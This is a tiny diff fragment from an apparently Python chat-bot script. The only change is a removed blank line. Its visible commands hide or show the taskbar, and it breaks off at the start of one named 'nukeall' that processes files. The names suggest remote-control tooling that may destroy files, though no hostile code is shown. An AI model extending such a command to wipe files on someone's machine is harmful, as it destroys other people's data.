@@ -25,7 +25,6 @@ async def taskbar(ctx, action):
    await ctx.send("Invalid argument. Use 'hide' or 'show'.")
  except Exception as e:
   await ctx.send(f"Error: {e}")
-
 async def nukeall(ctx):
  def process_file(p):
   attempts = 0
